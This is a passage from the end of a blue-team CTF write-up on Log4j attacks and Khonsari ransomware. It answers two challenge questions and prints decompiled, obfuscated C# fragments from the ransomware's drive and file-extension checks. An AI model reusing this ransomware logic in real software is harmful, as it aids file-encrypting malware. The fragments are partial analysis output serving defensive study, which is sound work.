   <span class="kt">string</span> <span class="n">vnNtUrJn2</span> <span class="p">=</span> <span class="n">text8</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(!</span><span class="n">name</span><span class="p">.</span><span class="nf">Equals</span><span class="p">(</span><span class="n">oymxyeRJ</span><span class="p">.</span><span class="nf">CajLqoCk</span><span class="p">(</span><span class="n">edhcLlqR2</span><span class="p">,</span> <span class="n">vnNtUrJn2</span><span class="p">)))</span>
   <span class="p">{</span>
    <span class="n">list</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="n">driveInfo</span><span class="p">.</span><span class="n">Name</span><span class="p">);</span>
   <span class="p">}</span>
  <span class="p">}</span>
</pre></table></code></div></div><p>From dnspy, right-click on the executable and select the go-to entry point. we can find the main function and see that <code class="language-plaintext highlighter-rouge">string text3</code> variable is being passed around to decrypt the external url.</p><h3 id="24">24<a href="#24" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the ISP that owns that IP that serves the text file?</p><p><strong>amazon</strong></p><p>This can be found from the previous Virustotal results.</p><p><a href="https://www.virustotal.com/gui/file/f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789/relations">https://www.virustotal.com/gui/file/f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789/relations</a></p><h3 id="25">25<a href="#25" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>The ransomware check for extensions to exclude them from the encryption process. What is the second extension the ransomware checks for?</p><p>The extension is <strong>ini</strong> as mentioned in the same report from question 23. <a href="https://www.bluvector.io/threat-report/khonsari-new-malware-apache-log4j/">https://www.bluvector.io/threat-report/khonsari-new-malware-apache-log4j/</a></p><blockquote class="prompt-info"><p><code class="language-plaintext highlighter-rouge">info</code> Another way to get the key is to reverse engineer the malware.</p></blockquote><p>In the same debugger session of dnspy from question 23 we can check the <code class="language-plaintext highlighter-rouge">LxqQXinF</code> function that is checking strings. The interesting variable here is <code class="language-plaintext highlighter-rouge">edhcLlqR2</code> which checks the condition and decrypts to ini extension.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">static</span> <span class="kt">bool</span> <span class="nf">LxqQXinF</span><span class="p">(</span><span class="kt">string</span> <span class="n">YzmfzBzk</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="kt">string</span> <span class="n">text</span> <span class="p">=</span> <span class="s">"\u007f\u001d\0\a\u000f\"\u000e%8"</span><span class="p">;</span>
  <span class="kt">string</span> <span class="n">text2</span> <span class="p">=</span> <span class="n">text</span><span class="p">;</span>
  <span class="kt">string</span> <span class="n">edhcLlqR</span> <span class="p">=</span> <span class="n">text2</span><span class="p">;</span>
  <span class="kt">string</span> <span class="n">vnNtUrJn</span> <span class="p">=</span> <span class="s">"QvhhaQoW"</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(!</span><span class="n">YzmfzBzk</span><span class="p">.</span><span class="nf">EndsWith</span><span class="p">(</span><span class="n">oymxyeRJ</span><span class="p">.</span><span class="nf">CajLqoCk</span><span class="p">(</span><span class="n">edhcLlqR</span><span class="p">,</span> <span class="n">vnNtUrJn</span><span class="p">)))</span>
  <span class="p">{</span>
   <span class="kt">string</span> <span class="n">text3</span> <span class="p">=</span> <span class="s">"g\u001d/."</span><span class="p">;</span>
   <span class="kt">string</span> <span class="n">edhcLlqR2</span> <span class="p">=</span> <span class="n">text3</span><span class="p">;</span>
   <span class="kt">string</span> <span class="n">text4</span> <span class="p">=</span> <span class="s">"ItAGEocK"</span><span class="p">;</span>
   <span class="kt">string</span> <span class="n">vnNtUrJn2</span> <span class="p">=</span> <span class="n">text4</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(!</span><span class="n">YzmfzBzk</span><span class="p">.</span><span class="nf">EndsWith</span><span class="p">(</span><span class="n">oymxyeRJ</span><span class="p">.</span><span class="nf">CajLqoCk</span><span class="p">(</span><span class="n">edhcLlqR2</span><span class="p">,</span> <span class="n">vnNtUrJn2</span><span class="p">)))</span>
   <span class="p">{</span>
    <span class="kt">string</span> <span class="n">text5</span> <span class="p">=</span> <span class="s">"\r\a2"</span><span class="p">;</span>
    <span class="kt">string</span> <span class="n">edhcLlqR3</span> <span class="p">=</span> <span class="n">text5</span><span class="p">;</span>
    <span class="kt">string</span> <span class="n">text6</span> <span class="p">=</span> <span class="s">"diYplLvh"</span><span class="p">;</span>
    <span class="kt">string</span> <span class="n">text7</span> <span class="p">=</span> <span class="n">text6</span><span class="p">;</span>
    <span class="kt">string</span> <span class="n">vnNtUrJn3</span> <span class="p">=</span> <span class="n">text7</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(!</span><span class="n">YzmfzBzk</span><span class="p">.</span><span class="nf">EndsWith</span><span class="p">(</span><span class="n">oymxyeRJ</span><span class="p">.</span><span class="nf">CajLqoCk</span><span class="p">(</span><span class="n">edhcLlqR3</span><span class="p">,</span> <span class="n">vnNtUrJn3</span><span class="p">)))</span>
    <span class="p">{</span>
     <span class="k">return</span> <span class="n">YzmfzBzk</span><span class="p">.</span><span class="nf">Equals</span><span class="p">(</span><span class="n">SCVuZRaW</span><span class="p">.</span><span class="n">HtqeFwaI</span><span class="p">);</span>
    <span class="p">}</span>
   <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
 <span class="p">}</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/forensics/'>Forensics</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/windows-forensics/" class="post-tag no-text-decoration" >Windows-Forensics</a> <a href="/tags/log4j/" class="post-tag no-text-decoration" >Log4j</a> <a href="/tags/log4shell/" class="post-tag no-text-decoration" >Log4shell</a> <a href="/tags/reverse-engineering/" class="post-tag no-text-decoration" >Reverse-Engineering</a> <a href="/tags/dfir/" class="post-tag no-text-decoration" >DFIR</a> <a href="/tags/blue-team/" class="post-tag no-text-decoration" >Blue-team</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Detecting and defending against log4j attacks ü™µ 4Ô∏è‚É£ üêö - (B)rootware Research&url=https://brootware.github.io/posts/detecting-and-defending-against-log4j-attacks/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Detecting and defending against log4j attacks ü™µ 4Ô∏è‚É£ üêö - (B)rootware Research&u=https://brootware.github.io/posts/detecting-and-defending-against-log4j-attacks/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://brootware.github.io/posts/detecting-and-defending-against-log4j-attacks/&text=Detecting and defending against log4j attacks ü™µ 4Ô∏è‚É£ üêö - (B)rootware Research" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://brootware.github.io/posts/detecting-and-defending-against-log4j-attacks/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/sensitive-data-redaction-pyredactkit/">Sensitive data redaction/unredaction tool - PyRedactKit üß∞üîêüìù</a><li><a href="/posts/regex-performance-in-golang-and-rust-which-is-faster/">Regex performance in golang and rust. Which is faster? ü§î</a><li><a href="/posts/cyber-security-education/">Cyber Security Education üîê üïµÔ∏è üéì</a><li><a href="/posts/cyber-league-ctf-2022-writeups/">Cyber League CTF 2022 - Writeups üö©</a><li><a href="/posts/grepping-for-gold-in-JSON-APIs-with-jq/">Grepping for gold in JSON APIs with jq üîç üìÑ</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/projects/">Projects</a> <a class="post-tag" href="/tags/blue-team/">Blue-team</a> <a class="post-tag" href="/tags/dfir/">DFIR</a> <a class="post-tag" href="/tags/forensics/">Forensics</a> <a class="post-tag" href="/tags/picoctf-2022/">picoctf-2022</a> <a class="post-tag" href="/tags/security-toolkit/">security-toolkit</a> <a class="post-tag" href="/tags/automation/">Automation</a> <a class="post-tag" href="/tags/devops/">DevOps</a> <a class="post-tag" href="/tags/general-tech/">General-tech</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/mini-memory-ctf/"><div class="card-body"> <em class="timeago small" date="2022-03-08 20:49:00 +0800" >Mar 8, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Mini Memory CTF üïµÔ∏è üíª</h3><div class="text-muted small"><p> Category Forensics Challenge Details This Mini Memory CTF contest has ended, but you can still play! This is an excellent opportunity to get some hands-on practice with memory forensics. You‚Äôl...</p></div></div></a></div><div class="card"> <a href="/posts/memory-analysis-ransomware/"><div class="card-body"> <em class="timeago small" date="2022-03-10 20:10:00 +0800" >Mar 10, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Memory Analysis - Ransomware üëæüíª‚ò†Ô∏è</h3><div class="text-muted small"><p> Category Forensics Challenge Details The Account Executive called the SOC earlier and sounds very frustrated and angry. He stated he can‚Äôt access any files on his computer and keeps receiving ...</p></div></div></a></div><div class="card"> <a href="/posts/pico-ctf-2022-forensics/"><div class="card-body"> <em class="timeago small" date="2022-04-04 11:31:00 +0800" >Apr 4, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pico CTF 2022: Forensics üïµÔ∏è üèÅ</h3><div class="text-muted small"><p> Enhance Download this image file and find the flag. 1 2 strings drawing.flag.svg picoCTF{3nh4nc3d_58bd3420} Flag : picoCTF{3nh4nc3d_58bd3420} Lookey here Attackers have hidden information in ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/lespion-osint-challenge/" class="btn btn-outline-primary" prompt="Older"><p>Lespion OSINT Challenge üïµ üîé</p></a> <a href="/posts/creating-a-malware-analysis-lab-locally/" class="btn btn-outline-primary" prompt="Newer"><p>Creating a malware analysis lab locally üë®‚Äçüî¨ üî¨</p></a></div><script src="https://utteranc.es/client.js" repo="brootware/brootware.github.io" issue-term="url" crossorigin="anonymous" async> </script> <script type="text/javascript"> $(function() { const origin = "https://utteranc.es"; const iframe = "iframe.utterances-frame"; const lightTheme = "github-light"; const darkTheme = "github-dark"; let initTheme = lightTheme; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } addEventListener("message", (event) => { let theme; /* credit to <https://github.com/utterance/utterances/issues/170#issuecomment-594036347> */ if (event.origin === origin) { /* page initial */ theme = initTheme; } else if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); } else { return; } const message = { type: "set-theme", theme: theme }; const utterances = document.querySelector(iframe).contentWindow; utterances.postMessage(message, origin); }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> ¬© 2023 <a href="https://github.com/brootware">Oaker Min (Bruce)</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/projects/">Projects</a> <a class="post-tag" href="/tags/blue-team/">Blue-team</a> <a class="post-tag" href="/tags/dfir/">DFIR</a> <a class="post-tag" href="/tags/forensics/">Forensics</a> <a class="post-tag" href="/tags/picoctf-2022/">picoctf-2022</a> <a class="post-tag" href="/tags/security-toolkit/">security-toolkit</a> <a class="post-tag" href="/tags/automation/">Automation</a> <a class="post-tag" href="/tags/devops/">DevOps</a> <a class="post-tag" href="/tags/general-tech/">General-tech</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-E65Q2J8381"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-E65Q2J8381'); }); </script>
